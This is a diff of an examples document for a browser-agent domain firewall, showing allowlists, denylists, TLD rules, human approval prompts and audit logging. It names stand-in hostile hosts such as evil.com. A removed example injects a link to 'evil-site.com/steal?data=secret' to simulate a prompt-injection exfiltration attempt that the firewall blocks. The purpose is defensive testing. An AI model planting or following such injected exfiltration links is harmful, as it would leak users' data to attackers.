@@ -1,10 +1,93 @@
 # Domain Firewall Examples
 
-Practical patterns for using the CDP domain firewall with composable policies.
+## CLI Examples
 
-## Example 1: Basic Allowlist
+### Example 1: Lock agent to specific domains
 
-**User request**: "Lock my agent to only browse Wikipedia and GitHub"
+```bash
+# Only allow Stripe docs and GitHub — block everything else
+node domain-firewall.mjs --session-id $SID \
+  --allowlist "docs.stripe.com,stripe.com,github.com" \
+  --default deny
+```
+
+Output:
+```
+[14:30:01] ALLOWED  docs.stripe.com          (allowlist)
+[14:30:05] BLOCKED evil.com                  (default)
+[14:30:08] ALLOWED  stripe.com               (allowlist)
+```
+
+### Example 2: Block known-bad, allow everything else
+
+```bash
+# Permissive mode — only block specific threats
+node domain-firewall.mjs --session-id $SID \
+  --denylist "evil.com,phishing-site.com,malware.download" \
+  --default allow
+```
+
+### Example 3: Local Chrome with honeypot test
+
+```bash
+# Start Chrome
+/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
+  --remote-debugging-port=9222 --headless=new about:blank &
+
+# Get CDP URL
+CDP_URL=$(curl -s http://localhost:9222/json/version | jq -r .webSocketDebuggerUrl)
+
+# Start firewall — only allow localhost
+node domain-firewall.mjs --cdp-url "$CDP_URL" \
+  --allowlist "localhost" --default deny
+
+# In another terminal, navigate:
+#   localhost:8080 → ALLOWED
+#   127.0.0.1:9090 → BLOCKED (different hostname)
+#   evil.com → BLOCKED
+```
+
+### Example 4: JSON logging for post-session analysis
+
+```bash
+# Run firewall with JSON output
+node domain-firewall.mjs --session-id $SID \
+  --allowlist "example.com" --default deny --json > firewall.log &
+
+# ... agent browses ...
+
+# Analyze blocked navigations
+cat firewall.log | jq 'select(.action == "BLOCKED")'
+
+# Count blocks per domain
+cat firewall.log | jq -r 'select(.action == "BLOCKED") | .domain' | sort | uniq -c | sort -rn
+```
+
+### Example 5: Protect a browse CLI session
+
+```bash
+# Create session
+SESSION_ID=$(bb sessions create --body '{"projectId":"...","keepAlive":true}' | jq -r .id)
+
+# Enable firewall in background
+node domain-firewall.mjs --session-id $SESSION_ID \
+  --allowlist "docs.stripe.com,stripe.com" --default deny &
+
+# Browse normally — firewall is transparent
+browse open https://docs.stripe.com --session-id $SESSION_ID
+browse snapshot
+# ... agent works ...
+
+# Malicious navigation from page content → automatically blocked
+```
+
+---
+
+## Code Integration Examples (TypeScript API)
+
+For developers embedding the firewall directly in Stagehand projects.
+
+### Example 6: Basic Allowlist
 
 ```typescript
 import { Stagehand } from "@browserbasehq/stagehand";
@@ -21,232 +104,26 @@ await installDomainFirewall(page, {
   defaultVerdict: "deny",
 });
 
-// These work:
-await page.goto("https://en.wikipedia.org/wiki/Node.js");
-await page.goto("https://github.com/browserbase/stagehand");
-
-// This is blocked:
-await page.goto("https://example.com").catch(() => {
-  console.log("Denied — not in allowlist");
-});
+await page.goto("https://en.wikipedia.org/wiki/Node.js");        // allowed
+await page.goto("https://example.com").catch(() => "blocked");    // blocked
 
 await stagehand.close();
 ```
 
-## Example 2: Human-in-the-Loop Approval (stdin)
-
-**User request**: "Let the agent browse, but ask me before it visits unknown domains"
-
-The browser freezes on the current page while the terminal waits for your `y`/`n` input.
+### Example 7: Human-in-the-Loop Approval (stdin)
 
 ```typescript
 import * as readline from "readline/promises";
-import {
-  installDomainFirewall,
-  allowlist,
-  interactive,
-  type NavigationRequest,
-} from "./domain-firewall";
+import { installDomainFirewall, allowlist, interactive } from "./domain-firewall";
 
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout,
-});
-
-const promptUser = async (req: NavigationRequest): Promise<"allow" | "deny"> => {
-  console.log(`\n  Agent wants to visit: ${req.domain}`);
-  console.log(`  URL: ${req.url}`);
-  const answer = await rl.question("  Allow? (y/n): ");
-  return answer.trim().toLowerCase().startsWith("y") ? "allow" : "deny";
-};
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
 await installDomainFirewall(page, {
   policies: [
-    allowlist(["en.wikipedia.org"]),                                    // known-good: instant
-    interactive(promptUser, { timeoutMs: 60000, onTimeout: "deny" }),   // unknown: ask operator
-  ],
-  defaultVerdict: "deny",
-});
-
-// Wikipedia: passes through instantly (allowlist)
-await page.goto("https://en.wikipedia.org/wiki/Web_browser");
-
-// example.com: held → terminal prompts "Allow? (y/n):" → you decide
-const result = await page
-  .goto("https://example.com", { timeoutMs: 65000 })
-  .catch((e: any) => e);
-
-if (result instanceof Error) {
-  console.log("You denied the navigation");
-} else {
-  console.log(`Approved — now on: ${page.url()}`);
-}
-
-// Don't forget to close readline when done
-rl.close();
-```
-
-## Example 3: Catching Malicious Link Clicks
-
-**User request**: "Protect my agent against prompt injection links on untrusted pages"
-
-The firewall catches navigations from DOM clicks — not just `page.goto()`.
-
-```typescript
-import { installDomainFirewall, allowlist, denylist } from "./domain-firewall";
-
-await installDomainFirewall(page, {
-  policies: [
-    denylist(["evil-site.com", "phishing.com"]),
     allowlist(["en.wikipedia.org"]),
-  ],
-  defaultVerdict: "deny",
-});
-
-// Navigate to a trusted page
-await page.goto("https://en.wikipedia.org/wiki/Web_browser", {
-  waitUntil: "domcontentloaded",
-});
-
-// Simulate a malicious link injected into the page (e.g. via prompt injection)
-await page.sendCDP("Runtime.evaluate", {
-  expression: `
-    const link = document.createElement("a");
-    link.href = "https://evil-site.com/steal?data=secret";
-    link.id = "malicious-link";
-    link.textContent = "Click here for more info";
-    document.body.prepend(link);
-  `,
-});
-
-// When the agent clicks this link, the firewall catches it
-await page.sendCDP("Runtime.evaluate", {
-  expression: `document.getElementById("malicious-link").click()`,
-});
-
-await new Promise((r) => setTimeout(r, 500));
-console.log(`URL after click: ${page.url()}`);
-// Still on Wikipedia — the malicious navigation was blocked by denylist policy
-```
-
-## Example 4: TLD and Pattern Rules
-
-**User request**: "Allow educational and open-source domains, block suspicious TLDs, and allow all GitHub subdomains"
-
-```typescript
-import {
-  installDomainFirewall,
-  denylist,
-  allowlist,
-  tld,
-  pattern,
-} from "./domain-firewall";
-
-await installDomainFirewall(page, {
-  policies: [
-    denylist(["evil.com"]),                                // 1. known-bad
-    allowlist(["github.com"]),                             // 2. known-good
-    pattern(["*.github.com", "*.githubusercontent.com"], "allow"),  // 3. GitHub subdomains
-    tld({ ".org": "allow", ".edu": "allow", ".gov": "allow" }),    // 4. trusted TLDs
-    pattern(["*.ru", "*.cn"], "deny"),                     // 5. suspicious patterns
-  ],
-  defaultVerdict: "deny",
-});
-
-// github.com → allowed (allowlist)
-// raw.githubusercontent.com → allowed (pattern)
-// mozilla.org → allowed (tld: .org)
-// mit.edu → allowed (tld: .edu)
-// sketchy.ru → denied (pattern: *.ru)
-// example.com → denied (default)
-```
-
-## Example 5: Audit Log with Policy Attribution
-
-**User request**: "Log all navigation attempts and show which policy decided each one"
-
-```typescript
-import {
-  installDomainFirewall,
-  denylist,
-  allowlist,
-  tld,
-  type AuditEntry,
-} from "./domain-firewall";
-
-const auditLog: AuditEntry[] = [];
-
-await installDomainFirewall(page, {
-  policies: [
-    denylist(["evil.com"]),
-    allowlist(["en.wikipedia.org", "github.com"]),
-    tld({ ".org": "allow" }),
-  ],
-  defaultVerdict: "deny",
-  auditLog,
-});
-
-// ... agent performs browsing tasks ...
-
-// Print audit report
-console.log("\n=== Navigation Audit Report ===\n");
-
-for (const entry of auditLog) {
-  const icon = entry.action === "ALLOWED" ? "PASS" : "DENY";
-  console.log(
-    `[${entry.time}] ${icon.padEnd(5)} ${entry.domain.padEnd(30)} decided by: ${entry.decidedBy}`,
-  );
-}
-// Example output:
-//   [14:23:01] PASS  en.wikipedia.org               decided by: allowlist
-//   [14:23:05] PASS  github.com                     decided by: allowlist
-//   [14:23:08] DENY  evil.com                       decided by: denylist
-//   [14:23:10] PASS  mozilla.org                    decided by: tld
-//   [14:23:12] DENY  example.com                    decided by: default
-```
-
-## Example 6: Full Policy Chain
-
-**User request**: "Set up comprehensive navigation security with known-bad blocking, known-good allowing, TLD rules, and human approval as a fallback"
-
-```typescript
-import {
-  installDomainFirewall,
-  denylist,
-  allowlist,
-  tld,
-  pattern,
-  interactive,
-  type AuditEntry,
-} from "./domain-firewall";
-
-const auditLog: AuditEntry[] = [];
-
-await installDomainFirewall(page, {
-  policies: [
-    // Layer 1: Hard deny known-bad domains (instant)
-    denylist(["evil.com", "phishing-site.com", "malware.download"]),
-
-    // Layer 2: Allow known-good domains (instant)
-    allowlist([
-      "en.wikipedia.org",
-      "github.com",
-      "docs.google.com",
-    ]),
-
-    // Layer 3: Allow GitHub ecosystem subdomains (instant)
-    pattern(["*.github.com", "*.githubusercontent.com"], "allow"),
-
-    // Layer 4: Allow trusted TLDs (instant)
-    tld({ ".org": "allow", ".edu": "allow", ".gov": "allow" }),
-
-    // Layer 5: Block suspicious TLD patterns (instant)
-    pattern(["*.ru", "*.cn", "*.tk"], "deny"),
-
-    // Layer 6: Everything else — ask the operator via stdin (60s timeout)
     interactive(
       async (req) => {
-        console.log(`\n  Unknown domain: ${req.domain} (${req.url})`);
+        console.log(`\n  Agent wants to visit: ${req.domain} (${req.url})`);
         const answer = await rl.question("  Allow? (y/n): ");
         return answer.trim().toLowerCase().startsWith("y") ? "allow" : "deny";
       },
@@ -254,27 +131,40 @@ await installDomainFirewall(page, {
     ),
   ],
   defaultVerdict: "deny",
+});
+
+// Wikipedia: instant (allowlist). Unknown domain: held → terminal prompts → you decide.
+rl.close();
+```
+
+### Example 8: Full Policy Chain
+
+```typescript
+import {
+  installDomainFirewall,
+  denylist, allowlist, tld, pattern, interactive,
+  type AuditEntry,
+} from "./domain-firewall";
+
+const auditLog: AuditEntry[] = [];
+
+await installDomainFirewall(page, {
+  policies: [
+    denylist(["evil.com", "phishing-site.com"]),                     // 1. block known-bad
+    allowlist(["github.com", "docs.google.com"]),                    // 2. allow known-good
+    pattern(["*.github.com", "*.githubusercontent.com"], "allow"),   // 3. GitHub subdomains
+    tld({ ".org": "allow", ".edu": "allow", ".gov": "allow" }),     // 4. trusted TLDs
+    pattern(["*.ru", "*.cn", "*.tk"], "deny"),                       // 5. suspicious TLDs
+    interactive(promptUser, { timeoutMs: 60000, onTimeout: "deny" }),// 6. ask human
+  ],
+  defaultVerdict: "deny",
   auditLog,
 });
 ```
 
-**Policy evaluation flow for `docs.google.com`**:
-1. denylist → abstain (not in list)
-2. allowlist → allow (match!)
-
-**Policy evaluation flow for `unknown-site.xyz`**:
-1. denylist → abstain
-2. allowlist → abstain
-3. pattern:allow → abstain
-4. tld → abstain (`.xyz` not in rules)
-5. pattern:deny → abstain (not `*.ru`/`*.cn`/`*.tk`)
-6. interactive → asks human → "deny" (or timeout → "deny")
-
 ## Tips
 
-- **Policy order is your security model**: Put denylists first (fail-fast for known threats), then allowlists, then broad rules (TLD/pattern), then interactive as the last resort.
-- **Subdomain coverage**: `allowlist(["github.com"])` does NOT match `api.github.com`. Use `pattern(["*.github.com"], "allow")` for subdomains.
-- **Custom policies are easy**: Any `{ name, evaluate }` object works. Use this for time-based rules, rate limiting, or domain reputation lookups.
-- **Production timeout pattern**: Always set `timeoutMs` on `interactive()`. A request held indefinitely ties up browser resources.
-- **Testing your firewall**: Use `page.sendCDP("Runtime.evaluate")` to inject links and click them programmatically, as shown in Example 3. This simulates prompt injection.
-- **Audit log for debugging**: If a navigation is unexpectedly blocked or allowed, check `decidedBy` in the audit log to see which policy made the decision.
+- **Policy order is your security model**: denylists first (fail-fast), then allowlists, then broad rules, then interactive as fallback.
+- **Subdomain coverage**: `allowlist(["github.com"])` does NOT match `api.github.com`. Use `pattern(["*.github.com"], "allow")` or list subdomains explicitly in the CLI `--allowlist`.
+- **Start the firewall before browsing**: install before the first navigation so all requests are intercepted.
+- **Audit log**: in code mode, pass `auditLog: []` and check `decidedBy` to see which policy made each decision. In CLI mode, use `--json` and pipe to `jq`.
